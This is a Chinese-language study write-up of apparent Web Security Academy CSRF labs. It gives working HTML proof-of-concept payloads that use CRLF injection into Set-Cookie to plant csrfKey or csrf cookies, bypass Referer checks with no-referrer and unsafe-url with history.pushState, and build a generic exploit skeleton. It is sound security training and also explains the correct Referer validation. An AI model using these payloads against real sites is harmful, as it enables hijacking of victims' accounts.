# Day 2 · CSRF 令牌绑定缺陷与 Referer 绕过（3 h）

> 目标：从"删参数/换方法"升级到"改 Cookie"，再收掉 Referer 校验的两种写法。
> 今天真正的新技能只有一个：**用 CRLF 注入在受害者浏览器里写 Cookie**。学会它，Lab 5 和 Lab 6 是同一道题。

## 时间轴

| 时段 | 内容 | 产出 |
|------|------|------|
| 00:00–00:20 | 复习 4 个 bypass，画"校验分支树" | 决策树 |
| 00:20–00:40 | 学 CRLF + `Set-Cookie` 反射：先在自己的浏览器里打自己 | 可复现的注入 |
| 00:40–01:25 | Lab 5 令牌绑非 session cookie | 双步 PoC |
| 01:25–02:05 | Lab 6 双提交（token 在 cookie 里复制一份） | 伪造 token |
| 02:05–02:40 | Lab 7 / Lab 8 Referer 两种绕过 | 两个 meta 标签 |
| 02:40–03:00 | 归纳 + 写矩阵 | 8 行 bypass 表 |

---

## 0. 新武器：CRLF 注入 + `Set-Cookie` 反射

Lab 5/6 的共同前提是：**攻击者必须能在受害者浏览器里写入一个指定值的 Cookie**。靶场给的入口是搜索功能——搜索词被回显到 `Set-Cookie: LastSearchTerm=<词>` 里，而 `<词>` 没做换行过滤。

于是 `search` 参数里的 `%0d%0a` 就成了"响应头换行"，后面接什么就写什么响应头：

```
GET /?search=test%0d%0aSet-Cookie:%20csrfKey=abc%3b%20SameSite=None HTTP/1.1
```

响应变成：

```http
HTTP/1.1 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrfKey=abc; SameSite=None
```

三个细节，一个都不能少：

1. **`%0d%0a`**：CRLF。必须编码，否则浏览器/代理会自己拆行。
2. **`%20`**：`Set-Cookie:` 后面的空格。很多后端会把裸空格吃掉。
3. **`%3b`**：分号。不编码的话分号在 URL 里会被当参数分隔符。
4. **`; SameSite=None`**：不写这一句，Chrome 会按 `Lax` 处理或不保存，跨站 POST 就不带这个 cookie，前功尽弃。这是本 day 最贵的坑。

**自测方法**：把上面这条 URL 直接粘进已登录的浏览器地址栏，然后 DevTools → Application → Cookies，看目标 cookie 是不是变成了你写的值。确认了再去写 exploit。

---

## Lab 5 · CSRF where token is tied to a non-session cookie（Practitioner / 45 min）

### 一句话
token 绑定在 `csrfKey` 这个**独立 Cookie** 上，而不是 `session`。所以：**换掉受害者的 `csrfKey` 成攻击者的，再提交攻击者的 token**，两边就自洽了。

### 观察
正常改邮箱请求：

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
Content-Type: application/x-www-form-urlencoded

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener%40normal-user.com
```

两个 cookie 分工明确：

- `session` → 我是谁（决定改谁的邮箱）
- `csrfKey` → 我的 token 属于哪一族（决定 token 是否匹配）

这是"会话框架和 CSRF 框架没打通"的经典产物。校验逻辑大致是 `token == store[csrfKey]`。

### 攻击（两步，顺序不能反）

**Step 1**：用 `wiener` 登录，从 `/my-account` 页面拿 `csrf` 值（记为 `TOKEN_A`），从 DevTools 拿 `csrfKey` 的值（记为 `KEY_A`）。

**Step 2**：PoC 先写 cookie，再提交表单：

```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="pwned@evil-user.net">
  <input type="hidden" name="csrf" value="TOKEN_A">
</form>
<img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=KEY_A%3b%20SameSite=None"
     onerror="document.forms[0].submit()">
```

### 为什么 `onerror` 这么写
`<img>` 请求本身负责**写 cookie**，但它返回的不是图片，所以一定触发 `onerror`；把表单提交挂在 `onerror` 上，就保证了**先写 cookie、后提交**的时序。直接写 `<script>submit()</script>` 有概率跑在 img 之前（尤其缓存命中时），顺序一乱就失败。

### 为什么有效
受害者带着自己的 `session`（身份=受害者）+ 攻击者的 `csrfKey`（族=攻击者）+ 攻击者的 `TOKEN_A`（匹配族）。三者一致，服务端校验通过，但真正被改的是受害者的账号——因为改谁由 `session` 决定。

### 坑
- 第一次失败是因为 cookie 注入没生效（`sameSite` 忘了写）。**先自测 cookie 是否落地，再谈时序。**
- `KEY_A` 是从浏览器 DevTools 复制的，注意别复制成 URL 编码后的值。
- 别用 `csrfKey` 的空格名写错（有的实例叫 `csrfKey`，别写成 `csrf_key`），以你抓到的包为准。

### 带走
看到两个 cookie（一个 session、一个看着像 CSRF 的），立刻问：**"哪个 cookie 决定身份？哪个决定 token 族？"** 如果两者可以分开，而站点又有任何"能写 cookie"的入口（子域、CRLF、`document.cookie` 的 XSS、同域其它应用），就能拼出这个攻击。

---

## Lab 6 · CSRF where token is duplicated in cookie（Practitioner / 40 min）

### 一句话
双提交（double submit）：服务端不存 token，只比较 `cookie 里的 csrf` 和 `body 里的 csrf` 是否相等。**那我随便造一个值，两边都写一样的就行。**

### 观察
```http
POST /my-account/change-email HTTP/1.1
Cookie: session=...; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
Content-Type: application/x-www-form-urlencoded

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener%40normal-user.com
```

cookie 和参数**字面相等**。服务端没有 token 库，只有一句 `if (cookie.csrf != body.csrf) reject`。

### 攻击
不需要登录、不需要拿任何真实 token。自己造一个字符串 `fake`：

```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="pwned@evil-user.net">
  <input type="hidden" name="csrf" value="fake">
</form>
<img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
     onerror="document.forms[0].submit()">
```

### 为什么有效
双提交的整个安全性依赖"攻击者无法给受害者写 cookie"。一旦存在 cookie 注入点，这个假设就没了，而攻击者制造的 token 天然自洽，连服务端状态都不用碰。

### 坑
- 值必须**完全一致**（大小写、长度）。有些实现还校验 32 位十六进制格式，那就造 `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`。
- 注入的 cookie 名要和服务端读的那个一致（这个 lab 是 `csrf`，不是 `csrfKey`）。
- 与 Lab 5 的唯一区别：Lab 5 需要先登录拿真 token，Lab 6 不需要。这个差别正好说明"双提交"在实现上有多脆。

### 带走
**双提交不是防御，是"假设你能守住 cookie 写入面"。** 真实项目里，只要同域下有一个子域能写 cookie、或者有 CRLF/响应头注入，双提交就等同于无防护。

---

## Lab 7 · Referer validation depends on header being present（Practitioner / 35 min）

### 一句话
有 `Referer` 就校验，没有就放行。用 `<meta name="referrer" content="no-referrer">` 让浏览器**不发** Referer。

### 观察
正常改邮箱请求带：

```http
Referer: https://LAB-ID.web-security-academy.net/my-account
```

把 Referer 头删掉重放 → 通过。说明逻辑是 `if (referer != null && !referer.startsWith(host)) reject`。

### 攻击
```html
<html>
  <head><meta name="referrer" content="no-referrer"></head>
  <body>
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

### 为什么有效
`no-referrer` 让这次导航/提交完全不带 `Referer` 头。"缺失"被当成"合法"，防护直接归零。

### 坑
- meta 必须在 `<head>` 里，且要在表单提交前解析到；放 body 末尾可能来不及。
- 有些浏览器对 `no-referrer` 下 `<form>` 提交仍带 origin——本 lab 环境不带；如果线上不生效，改试 `referrerpolicy="no-referrer"` 属性挂在 form 上。

### 带走
任何"**头缺失即放行**"的校验都是纸糊的：Referer、Origin、X-Requested-With、Content-Type 全都一样。测试动作固定：**删头重放**。

---

## Lab 8 · CSRF with broken Referer validation（Practitioner / 40 min）

### 一句话
校验只做**子串包含**（`referer.contains("LAB-ID.web-security-academy.net")`），那就把靶场域名塞进攻击者 URL 的 query 里，Referer 自然包含它。

### 观察
把 Referer 改成 `https://evil.com/?https://LAB-ID.web-security-academy.net/` → 通过。
改成 `https://LAB-ID.web-security-academy.net.evil.com/` → 也通过（子串匹配的另一种翻车方式）。
说明校验是 `contains`，不是"解析后比 host"。

### 攻击
关键点有两个：
1. **Referer 默认只发 origin**（`strict-origin-when-cross-origin`），origin 里没有 query。必须让浏览器发**完整 URL**。
2. 投递给受害者的地址是固定的 `/exploit`，没法在 URL 里加 query。所以用 **`history.pushState` 把当前页面的 URL 改掉**——页面不跳转，但后续请求的 Referer 会变成新 URL。

```html
<html>
  <head>
    <meta name="referrer" content="unsafe-url">
  </head>
  <body>
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net">
    </form>
    <script>
      history.pushState("", "", "/?LAB-ID.web-security-academy.net");
      document.forms[0].submit();
    </script>
  </body>
</html>
```

于是 Referer 变成：

```
Referer: https://exploit-ID.exploit-server.net/?LAB-ID.web-security-academy.net
```

`contains("LAB-ID.web-security-academy.net")` 为真 → 通过。

如果 meta 不生效（Chrome 有时在 `View exploit` 下仍带原 URL），改用 exploit server 的 **Head** 区加响应头：

```
Referrer-Policy: unsafe-url
```

注意这里的单词是 **Referrer**（响应头拼写），不是请求头 `Referer`——官方 solution 特意强调了这一点。

### 为什么有效
两个缺陷叠加：
1. **校验用子串而不是解析后的 host 比较**；
2. **Referer 可以被攻击者控制到"包含任意字符串"**（query、路径、甚至子域）。`pushState` 只是把第 2 点变成"不用改投递 URL 也能做到"。

### 坑
- 只写 `unsafe-url` 不改 URL → Referer 是 `https://exploit-.../exploit`，不含靶场域名 → 失败。
- 只 `pushState` 不写 `unsafe-url` → Referer 被裁成 origin（`https://exploit-...`），query 没了 → 失败。**两个都要做。**
- 别把 `pushState` 写在表单提交之后——它必须在 submit 之前执行，且同源（这里同源，没问题）。
- `View exploit` 时可能仍报 "invalid Referer header"，别慌：换 `Referrer-Policy` 响应头，或直接 Deliver（受害者环境不带你浏览器的策略缓存）。
- 邮箱别填成自己刚改过的（lab 不允许重复邮箱），否则失败原因会被误判成 Referer 问题。

### 带走
Referer 校验的正确写法只有一种：**解析成 URL → 取 host → 与允许列表精确比较**。凡是 `contains` / `endsWith` / 正则没锚定 `$`，都能用"域名塞进路径或 query"打掉。

---

## 当日复盘

### 8 个 lab 的 bypass 矩阵（这张表就是 CSRF 的全部考点）

| 防护写法 | 绕过手法 | Lab |
|----------|----------|-----|
| 无 | 直接构造 POST | 1 |
| 仅 POST 校验 | 改 GET，参数进 query | 2 |
| 存在才校验 | 删除整个参数 | 3 |
| token 全局池 | 用攻击者自己的 token | 4 |
| token 绑 `csrfKey` cookie | CRLF 写 cookie + 攻击者 token | 5 |
| 双提交（cookie==body） | CRLF 写 cookie + 自造 token | 6 |
| Referer 存在才校验 | `no-referrer` | 7 |
| Referer 子串匹配 | `unsafe-url` + 域名进 URL | 8 |

### 通用 exploit 骨架（背下来）

```html
<form action="https://TARGET/path" method="POST">
  <input type="hidden" name="参数" value="值">
</form>
<img src="https://TARGET/?注入点" onerror="document.forms[0].submit()">
<!-- 需要控制 Referer 时，在 <head> 加 meta referrer -->
```

### 三个问题自测
1. 为什么 Lab 5 与 Lab 6 的 cookie 注入串里必须带 `SameSite=None`？
2. Lab 8 里，`unsafe-url` 和"带域名 query 的 URL"各自解决什么问题？少一个会怎样？
3. 如果站点同时有 CSRF token 和 `SameSite=Strict`，还剩哪些攻击面？（提示：同站 sibling domain、on-site gadget、GET 型动作）

### 明日预告
Day 3 切到 SQL 注入。工具从"写 HTML"变成"读 SQL 报错"，节奏会慢下来。第一个 lab 5 分钟，第三个（Oracle 版本号）会卡 20 分钟——`v$version`、`dual`、`--` 后面那个空格，是当天的三个坎。
